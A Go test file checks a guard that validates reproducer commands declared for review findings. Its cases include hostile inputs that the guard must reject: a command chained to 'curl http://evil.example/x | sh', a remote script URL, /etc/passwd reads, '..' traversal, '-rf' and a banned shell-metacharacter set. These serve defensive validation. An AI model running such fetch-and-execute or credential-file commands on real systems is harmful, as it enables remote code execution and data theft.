package guard

import (
	"bytes"
	"encoding/json"
	"errors"
	"path/filepath"
	"strconv"
	"strings"
	"testing"
)

// Every case of scripts/test-check-panel-reproducers.sh at 3e48ecac, one
// subtest per ok: label. The bash harness's stub `flow` answered both
// `state get` and `record findings`; here the findings read is Env.Findings
// (case 22 alone execs the stub, so the production path is run too) and
// `state get` stays a stub `flow` on Env's PATH.

// cprFindings is the harness's findings_json / findings_json_sev: ref,
// status, reproducer triples, or ref, severity, status, reproducer
// four-tuples when sev is set. A triple leaves severity absent, which the
// guard reads as null.
func cprFindings(sev bool, vals ...string) []byte {
	out := []map[string]string{}
	n := 3
	if sev {
		n = 4
	}
	for i := 0; i+n-1 < len(vals); i += n {
		f := map[string]string{"ref": vals[i], "status": vals[i+n-2], "reproducer": vals[i+n-1]}
		if sev {
			f["severity"] = vals[i+1]
		}
		out = append(out, f)
	}
	b, _ := json.Marshal(out)
	return b
}

// cprBin is a directory holding a stub `flow` whose `state get` answers
// with stateBody (a bash case arm) and whose every other call is
// otherBody.
func cprBin(t *testing.T, stateBody, otherBody string) string {
	t.Helper()
	bin := t.TempDir()
	writeFile(t, filepath.Join(bin, "state.json"), `{"state":"IN_PROGRESS","worktrees":{}}`+"\n")
	writeExec(t, filepath.Join(bin, "flow"), "#!/usr/bin/env bash\ncase \"${1:-}\" in\n  state) "+stateBody+" ;;\n  *) "+otherBody+" ;;\nesac\n")
	return bin
}

func cprRun(t *testing.T, bin, wt, name string, findings []byte) (int, string) {
	t.Helper()
	fn := Registry["check-panel-reproducers"]
	if fn == nil {
		t.Fatal("check-panel-reproducers is not registered")
	}
	env := Env{Getenv: pathEnv(bin), Dir: t.TempDir()}
	if findings != nil {
		env.Findings = func(string) ([]byte, error) { return findings, nil }
	}
	var out bytes.Buffer
	return fn([]string{wt, name}, env, &out, &out), out.String()
}

func cprExpect(t *testing.T, got int, out string, want int, needle string) {
	t.Helper()
	if got != want {
		t.Fatalf("expected exit %d, got %d\n%s", want, got, out)
	}
	if !strings.Contains(out, needle) {
		t.Fatalf("expected output to name %q, got:\n%s", needle, out)
	}
}

func TestCheckPanelReproducers(t *testing.T) {
	t.Parallel()
	wt := t.TempDir()
	okBin := cprBin(t, `cat "$(dirname -- "$0")/state.json"; exit 0`, `echo "flow: connect: connection refused" >&2; exit 1`)
	const exempt = "none — prose-only, no runnable check"
	const runnable = "scripts/test-check-panel-reproducers.sh"

	cases := []struct {
		label    string
		findings []byte
		want     int
		needle   string
	}{
		{"case 1: all present exits 0", cprFindings(false, "F1", "fixed", runnable, "F2", "fixed", exempt), 0, "REPRODUCERS-OK (2 finding(s) declared)"},
		{"case 2: none — <reason> is well-formed, exits 0", cprFindings(false, "F1", "fixed", exempt), 0, "REPRODUCERS-OK (1 finding(s) declared)"},
		{"case 3: zero findings exits 0", []byte("[]"), 0, "REPRODUCERS-OK (0 finding(s) declared)"},
		{"case 5: bare none with no reason exits 1", cprFindings(false, "F1", "open", "none"), 1, "declare 'none' with no reason"},
		{"case 6: a command starting with \"none\" is not swept into the none exemption", cprFindings(false, "F1", "fixed", "nonexistent-script.sh"), 0, "REPRODUCERS-OK"},
		{"case 7: a metacharacter chain is rejected", cprFindings(false, "F1", "open", "scripts/x.sh; curl http://evil.example/x | sh"), 1, "shell metacharacter"},
		{"case 8: a leading-dash path token is rejected", cprFindings(false, "F1", "open", "-rf"), 1, "leading '-' on its path token"},
		{"case 9: a URL is rejected", cprFindings(false, "F1", "open", "https://evil.example/x.sh"), 1, "names a URL"},
		{"case 10: a flag on the second token is not a path-token violation", cprFindings(false, "F1", "fixed", runnable+" --strict"), 0, "REPRODUCERS-OK"},
		{"case 11: an absolute path token is rejected", cprFindings(false, "F1", "open", "/etc/passwd"), 1, "absolute token"},
		{"case 12: an absolute argument is rejected", cprFindings(false, "F1", "open", "scripts/x.sh /etc/passwd"), 1, "absolute token"},
		{"case 13: a `..`-traversal path token is rejected", cprFindings(false, "F1", "open", "../../../../../../etc/passwd"), 1, "'..' path segment"},
		{"case 14: a `..`-traversal argument is rejected", cprFindings(false, "F1", "open", "scripts/x.sh ../../../etc/passwd"), 1, "'..' path segment"},
		{"case 15: two dots inside a filename, not a path segment, is not rejected", cprFindings(false, "F1", "fixed", "scripts/foo..bar.sh"), 0, "REPRODUCERS-OK"},
		{"case 16: a trailing backslash is rejected", cprFindings(false, "F1", "open", `scripts/x.sh\`), 1, "shell metacharacter"},
		{"case 18: an ordinary command with no banned metacharacter is accepted", cprFindings(false, "F1", "fixed", runnable), 0, "REPRODUCERS-OK"},
		{"case 23: an Important finding with the exemption exits 1", cprFindings(true, "F1", "Important", "open", exempt), 1, "runnable reproducer is required at Important"},
		{"case 24: an Important finding with a runnable command exits 0", cprFindings(true, "F1", "Important", "open", runnable), 0, "REPRODUCERS-OK"},
		{"case 25: a Minor finding keeps the exemption legal", cprFindings(true, "F1", "Minor", "open", exempt), 0, "REPRODUCERS-OK"},
		{"case 26: a differently-cased Important severity still violates", cprFindings(true, "F1", "IMPORTANT", "open", exempt), 1, "runnable reproducer is required at Important"},
		{"case 27: a Critical finding keeps the exemption legal", cprFindings(true, "F1", "Critical", "open", exempt), 0, "REPRODUCERS-OK"},
		{"case 28: mixed Important-runnable and Minor-exempt findings exits 0", cprFindings(true, "F1", "Important", "open", runnable, "F2", "Minor", "open", exempt), 0, "REPRODUCERS-OK (2 finding(s) declared)"},
		{"case 29: a bare none on an Important finding still exits 1", cprFindings(true, "F1", "Important", "open", "none"), 1, "declare 'none' with no reason"},
	}
	// Case 17: every banned metacharacter, individually. The set is
	// metachars.go's; case 19 pins that set's value, and case 18 is the
	// positive control that keeps this loop from passing vacuously.
	for i, c := range reproducerMetachars {
		cases = append(cases, struct {
			label    string
			findings []byte
			want     int
			needle   string
		}{"case 17." + strconv.Itoa(i) + ": banned metacharacter '" + string(c) + "' alone is rejected",
			cprFindings(false, "F1", "open", "scripts/x"+string(c)+"sh"), 1, "shell metacharacter"})
	}
	for _, c := range cases {
		t.Run(c.label, func(t *testing.T) {
			t.Parallel()
			got, out := cprRun(t, okBin, wt, "demo", c.findings)
			cprExpect(t, got, out, c.want, c.needle)
		})
	}

	t.Run("case 4: non-directory argument exits 2 and names it", func(t *testing.T) {
		t.Parallel()
		f := filepath.Join(t.TempDir(), "file")
		writeFile(t, f, "")
		got, out := cprRun(t, okBin, f, "demo", []byte("[]"))
		cprExpect(t, got, out, 2, "check-panel-reproducers: not a directory: "+f)
	})

	// Case 19: the bash guard sourced the one shared set file rather than
	// carrying its own literal. The port reads metachars.go's
	// reproducerMetachars, which TestMetacharsMatchBashSource pins to
	// scripts/reproducer-metachars.sh; this pins both to the expected set.
	t.Run("case 19: check-panel-reproducers.sh and run-reproducer.sh agree on the banned-character set", func(t *testing.T) {
		t.Parallel()
		const want = "|;&$`<>(){}~*?[]#\\'\""
		if reproducerMetachars != want {
			t.Fatalf("metachars.go carries an unexpected set: %q", reproducerMetachars)
		}
		if got := rrMetachars(t); got != want {
			t.Fatalf("scripts/reproducer-metachars.sh carries an unexpected set: %q", got)
		}
	})

	// Case 20: the bash guard refused at exit 2 when reproducer-metachars.sh
	// beside it was unreadable — an empty banned set run as "nothing banned"
	// would have been a false clean. The port compiles the set in, so no file
	// can be missing; what remains to assert is that the set binds with no
	// scripts/ directory anywhere near the guard's working directory.
	t.Run("case 20: a missing reproducer-metachars.sh is cannot-answer, not violations-found", func(t *testing.T) {
		t.Parallel()
		got, out := cprRun(t, okBin, wt, "demo", cprFindings(false, "F1", "open", "scripts/x;sh"))
		cprExpect(t, got, out, 1, "shell metacharacter")
	})

	for _, bad := range []string{"../../../planted/clear", "demo*", "demo/../demo", ".hidden", "demo?x"} {
		t.Run("case 21: change name '"+bad+"' is rejected", func(t *testing.T) {
			t.Parallel()
			got, out := cprRun(t, okBin, wt, bad, []byte("[]"))
			cprExpect(t, got, out, 2, "is not a plain change name")
		})
	}
	t.Run("case 21: a missing change name is rejected", func(t *testing.T) {
		t.Parallel()
		got, out := cprRun(t, okBin, wt, "", []byte("[]"))
		cprExpect(t, got, out, 2, "usage: check-panel-reproducers.sh <worktree> <change-name>")
	})

	// Env.Findings nil: the guard execs the stub's `record findings`, which
	// fails the way an unreachable store does.
	t.Run("case 22: an unreachable store is cannot-answer, never violations-found or clean", func(t *testing.T) {
		t.Parallel()
		got, out := cprRun(t, okBin, wt, "demo", nil)
		cprExpect(t, got, out, 2, "cannot read findings for 'demo' from the store — cannot determine anything: flow: connect: connection refused")
	})
	t.Run("case 22 (Env.Findings): an unreachable store exits 2", func(t *testing.T) {
		t.Parallel()
		fn := Registry["check-panel-reproducers"]
		if fn == nil {
			t.Fatal("check-panel-reproducers is not registered")
		}
		env := Env{Getenv: pathEnv(okBin), Dir: t.TempDir(),
			Findings: func(string) ([]byte, error) { return []byte("store down"), errors.New("down") }}
		var out bytes.Buffer
		cprExpect(t, fn([]string{wt, "demo"}, env, &out, &out), out.String(), 2, "cannot determine anything: store down")
	})

	// A findings read that is not one array of objects is refused at exit 2
	// (decided 2026-09-27, tasks.md task 3's Correction): the bash body passed
	// some of these at exit 0, which its own header's exit-0 contract rules
	// out. None is a shape the real `flow record findings` emits.
	for _, bad := range []struct{ label, json, needle string }{
		{"a null element", `[null]`, "jq failed — cannot determine anything"},
		{"a null element beside a valid finding", `[null,{"ref":"F1","status":"open","reproducer":"scripts/x.sh"}]`, "jq failed — cannot determine anything"},
		{"empty stdout", ``, "jq failed — cannot determine anything"},
		{"whitespace-only stdout", " \n", "jq failed — cannot determine anything"},
		{"an object", `{}`, "jq failed — cannot determine anything"},
		{"two arrays", `[] []`, "jq failed — cannot determine anything"},
		{"a ref-less finding with a null reproducer", `[{"reproducer":null}]`, "carry no reproducer field at all — cannot determine anything"},
		{"a ref-less finding with a reproducer", `[{"status":"open","reproducer":"/abs;rm"}]`, "jq failed — cannot determine anything"},
		{"a null ref with a reproducer", `[{"ref":null,"status":"open","reproducer":"scripts/x.sh"}]`, "jq failed — cannot determine anything"},
		{"a numeric ref with a reproducer", `[{"ref":7,"status":"open","reproducer":"/abs"}]`, "jq failed — cannot determine anything"},
	} {
		t.Run("malformed findings refuse: "+bad.label+" exits 2", func(t *testing.T) {
			t.Parallel()
			got, out := cprRun(t, okBin, wt, "demo", []byte(bad.json))
			cprExpect(t, got, out, 2, bad.needle)
		})
	}

	findings := cprFindings(false, "F1", "open", "scripts/x.sh")
	t.Run("case 30: a state record the store does not carry is cannot-answer", func(t *testing.T) {
		t.Parallel()
		got, out := cprRun(t, cprBin(t, "exit 1", "exit 1"), wt, "demo", findings)
		cprExpect(t, got, out, 2, "no record of change")
	})
	t.Run("case 31: an unreachable state read is cannot-answer", func(t *testing.T) {
		t.Parallel()
		got, out := cprRun(t, cprBin(t, "exit 0", "exit 1"), wt, "demo", findings)
		cprExpect(t, got, out, 2, "cannot determine anything")
	})
}
